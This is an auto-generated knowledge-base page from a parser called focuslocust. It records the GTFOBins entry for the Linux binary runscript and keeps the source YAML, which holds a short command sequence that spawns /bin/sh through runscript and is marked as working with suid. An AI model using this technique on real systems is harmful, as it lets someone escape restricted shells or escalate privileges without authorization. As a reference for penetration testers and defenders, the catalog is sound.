---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# runscript

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `runscript` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/runscript` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [runscript](../../tools/linux/runscript.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | runscript |
| name | runscript |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/runscript/ |

## Preserved Source Material

```yaml
_body: ''
_name: runscript
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/runscript
functions:
  shell:
  - code: 'echo ''! exec /bin/sh'' >/path/to/temp-file

      runscript /path/to/temp-file'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
